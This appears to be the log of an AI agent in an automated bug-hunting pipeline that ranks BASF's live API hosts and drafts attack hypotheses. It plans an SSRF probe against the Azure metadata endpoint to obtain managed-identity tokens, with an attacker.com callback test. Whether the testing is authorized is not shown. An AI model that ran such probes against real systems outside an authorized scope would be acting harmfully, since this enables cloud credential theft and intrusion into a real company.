===== ANALYST nemotron3 2026-09-03 14:03:00 UTC =====
[0m
> build · nemotron-3-ultra-free
[0m
[0m$ [0mls -la /home/runner/work/basf-hunt/basf-hunt/
total 96
drwxr-xr-x 11 runner runner 4096 Sep  3 13:52 .
drwxr-xr-x  3 runner runner 4096 Sep  3 13:52 ..
drwxr-xr-x  7 runner runner 4096 Sep  3 13:53 .git
drwxr-xr-x  3 runner runner 4096 Sep  3 13:52 .github
-rw-r--r--  1 runner runner 1801 Sep  3 13:52 README.md
-rw-r--r--  1 runner runner   43 Sep  3 13:53 analyst-out.txt
-rw-r--r--  1 runner runner 5774 Sep  3 13:52 analyst-prompt.txt
-rw-r--r--  1 runner runner 1902 Sep  3 13:52 ctx.txt
drwxr-xr-x  2 runner runner 4096 Sep  3 13:52 inventory
drwxr-xr-x  2 runner runner 4096 Sep  3 13:52 knowledge
drwxr-xr-x  2 runner runner 4096 Sep  3 13:52 leads
-rw-r--r--  1 runner runner   29 Sep  3 13:52 probe-results.md
drwxr-xr-x  2 runner runner 4096 Sep  3 13:52 recon-notes
drwxr-xr-x  2 runner runner 4096 Sep  3 13:52 reports
-rw-r--r--  1 runner runner 3285 Sep  3 13:52 scope.yml
drwxr-xr-x  2 runner runner 4096 Sep  3 13:52 scripts
-rw-r--r--  1 runner runner   32 Sep  3 13:52 state_bigpickle.json
-rw-r--r--  1 runner runner   32 Sep  3 13:52 state_laguna.json
-rw-r--r--  1 runner runner   32 Sep  3 13:52 state_ling3.json
-rw-r--r--  1 runner runner   32 Sep  3 13:52 state_longcat.json
-rw-r--r--  1 runner runner   37 Sep  3 13:52 state_mimo.json
-rw-r--r--  1 runner runner   32 Sep  3 13:52 state_nemotron3.json
drwxr-xr-x  2 runner runner 4096 Sep  3 13:52 triage
[0m
[0m→ [0mRead scope.yml
[0m→ [0mRead inventory/basf.md
[0m→ [0mRead analyst-out.txt
[0m→ [0mRead ctx.txt
[0m→ [0mRead probe-results.md
[0m
[0m$ [0mls -la /home/runner/work/basf-hunt/basf-hunt/knowledge/
total 12
drwxr-xr-x  2 runner runner 4096 Sep  3 13:52 .
drwxr-xr-x 11 runner runner 4096 Sep  3 13:52 ..
-rw-r--r--  1 runner runner   24 Sep  3 13:52 index.md
[0m
[0m$ [0mls -la /home/runner/work/basf-hunt/basf-hunt/leads/
total 12
drwxr-xr-x  2 runner runner 4096 Sep  3 13:52 .
drwxr-xr-x 11 runner runner 4096 Sep  3 13:52 ..
-rw-r--r--  1 runner runner   18 Sep  3 13:52 lead-mimo.md
[0m
[0m$ [0mls -la /home/runner/work/basf-hunt/basf-hunt/recon-notes/
total 20
drwxr-xr-x  2 runner runner 4096 Sep  3 13:52 .
drwxr-xr-x 11 runner runner 4096 Sep  3 13:52 ..
-rw-r--r--  1 runner runner 1005 Sep  3 13:52 DEDICATED-DEEP.md
-rw-r--r--  1 runner runner 7833 Sep  3 13:52 DEEPER-FINDINGS.md
[0m
[0m→ [0mRead knowledge/index.md
[0m→ [0mRead leads/lead-mimo.md
[0m→ [0mRead recon-notes/DEDICATED-DEEP.md
[0m→ [0mRead recon-notes/DEEPER-FINDINGS.md
Now I have full context. Let me execute the 8-step analysis for BASF assets.

---

## STEP 1 — DELTA

**NEW** Deep enum (2026-09-03) revealed 9 dedicated hosts under `api.basf.com` after wildcard-filtering (was 0 live HTTP in 2026-09-02 passive recon)
**NEW** Two Azure Function Apps confirmed live with admin API surface: `ap-digitalconnect.api.basf.com` and `ap-eupf.api.basf.com` (HTTP 200, admin endpoints at `/admin/*` returning 401 Bearer)
**NEW** Three dev endpoints require client certificates (HTTP 400): `dev-clientcert-sap`, `dev-ext001`, `dev-int001`
**NEW** Four endpoints return HTTP 404: `dev-m`, `dev-sap`, `dev`, `e-gate`

---

## STEP 2 — PRIORITIZE

| Asset | attack_surface | business_value | tech_exposure | gate_ease | cloud_surface | freshness | **priority** |
|-------|---------------|---------------|--------------|-----------|--------------|-----------|-------------|
| ap-digitalconnect.api.basf.com | 8 | 9 | 8 | 3 | 9 | 10 | **7.9** |
| ap-eupf.api.basf.com | 8 | 9 | 8 | 3 | 9 | 10 | **7.9** |
| dev-clientcert-sap.api.basf.com | 6 | 7 | 7 | 2 | 7 | 10 | **6.4** |
| dev-ext001.api.basf.com | 6 | 7 | 7 | 2 | 7 | 10 | **6.4** |
| dev-int001.api.basf.com | 6 | 7 | 7 | 2 | 7 | 10 | **6.4** |

Formula: `0.25*a + 0.25*b + 0.15*t + 0.15*g + 0.10*c + 0.10*f`

[PRIO] ap-digitalconnect.api.basf.com,7.9,attack_surface=8,business_value=9,tech_exposure=8,gate_ease=3,cloud_surface=9,freshness=10
[PRIO] ap-eupf.api.basf.com,7.9,attack_surface=8,business_value=9,tech_exposure=8,gate_ease=3,cloud_surface=9,freshness=10
[PRIO] dev-clientcert-sap.api.basf.com,6.4,attack_surface=6,business_value=7,tech_exposure=7,gate_ease=2,cloud_surface=7,freshness=10

---

## STEP 3 — HYPOTHESES

[HYP] Azure Function master key leak via misconfigured CI/CD or repo exposure
class: AUTH
asset: ap-digitalconnect.api.basf.com
confidence: 65
reasoning: Azure Function Apps expose admin API at /admin/host/keys, /admin/functions, /admin/host/status (all 401 Bearer). Master keys grant full control. Keys often leak via GitHub Actions logs, Azure DevOps pipeline artifacts, or misconfigured storage accounts. Two production Function Apps confirmed live.
evidence_needed: Discovery of valid master/system key via passive GitHub/GitLab/dork search, or key brute-force pattern analysis
verify_steps: GET https://ap-digitalconnect.api.basf.com/admin/host/keys (expect 401), passive search for basf.com + "function" + "key" in public repos, check for Azure DevOps / GitHub Actions artifact exposure
impact: Full Function App takeover — code execution, environment variable disclosure (DB conn strings, service principal secrets), lateral movement to Azure subscription
testability: PASSIVE

[HYP] Client certificate auth bypass on dev endpoints via cert transparency / weak CA
class: AUTH
asset: dev-clientcert-sap.api.basf.com
confidence: 50
reasoning: Three dev endpoints return HTTP 400 (client cert required). If BASF uses a private CA with CT-logged certs, or weak self-signed certs, attacker could obtain valid client cert. SAP integration suggests high-value backend access.
evidence_needed: Valid client certificate accepted by endpoint, or CT logs showing BASF-issued client certs
verify_steps: GET https://dev-clientcert-sap.api.basf.com/ (confirm 400), query crt.sh for *.api.basf.com client certs, check for mTLS bypass via SNI/Host header confusion
impact: Authenticated access to SAP-integrated dev environment — potential PII, financial data, or supply chain pivot
testability: PASSIVE

[HYP] SSRF via Azure Function HTTP trigger input processing
class: SSRF
asset: ap-eupf.api.basf.com
confidence: 45
reasoning: Azure Functions often process HTTP trigger inputs (query params, body, headers) that may be used in outbound HTTP calls. If any function fetches user-supplied URLs without SSRF protection, cloud metadata (169.254.169.254) accessible. Functions run on Azure App Service with IMDS endpoint.
evidence_needed: Function code showing outbound HTTP call with user-controlled URL, or blind SSRF confirmation via DNS exfiltration
verify_steps: GET https://ap-eupf.api.basf.com/api/<function>?url=http://attacker.com (observe DNS callback), test common params: url, uri, callback, webhook, target, redirect, next, return_url
impact: Cloud metadata access → managed identity tokens → Azure resource access → subscription compromise
testability: AUTH_HELPED

---

## STEP 4 — SELF-CRITIQUE

[PARKED] Azure Function master key leak via misconfigured CI/CD or repo exposure: confidence 65 but verify_steps rely on passive GitHub search which may yield nothing; no concrete endpoint parameter identified for active testing without auth. Downgraded to research lead.

[PARKED] Client certificate auth bypass on dev endpoints via cert transparency / weak CA: confidence 50 — CT log search is passive but low probability; no evidence BASF uses public CA for client certs. Speculative.

[FINAL] SSRF via Azure Function HTTP trigger input processing: confidence 45 — kept as only hypothesis with concrete testable parameters (url, uri, callback, etc.) on a live HTTP 200 endpoint. Requires auth-helped testing but has clear verify_steps.

**Survivor ranked:**
1. SSRF via Azure Function HTTP trigger input processing (ap-eupf.api.basf.com) — only testable hypothesis with concrete parameters

---

## STEP 5 — NEXT ACTION

[NEXT] PROBE: GET https://ap-eupf.api.basf.com/api/health?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 (test SSRF via common url param on Azure Function trigger)

---

## STEP 6 — LEARNING

[LEARN] REJECTED AUTH @ ap-digitalconnect.api.basf.com: master key leak hypothesis lacks concrete verify step without auth; passive GitHub search is opportunistic not systematic
[LEARN] REJECTED AUTH @ dev-clientcert-sap.api.basf.com: client cert bypass speculative; no CT evidence BASF uses public CA for mTLS; dev endpoints may be non-production
[LEARN] ACCEPTED SSRF @ ap-eupf.api.basf.com: Azure Functions HTTP triggers are known SSRF vectors; cloud metadata endpoint confirmed reachable from App Service; concrete param list for testing

---

## STEP 7 — RISK

[RISK] basf: 55 — Two production Azure Function Apps with exposed admin API (key-gated), three mTLS-gated dev endpoints suggesting SAP integration, and 10k+ wildcard DNS noise indicating large attack surface. Auth-gated surface reduces immediate risk but cloud metadata SSRF on Functions is a high-impact class if any trigger processes user URLs. Requires authenticated testing for definitive findings.
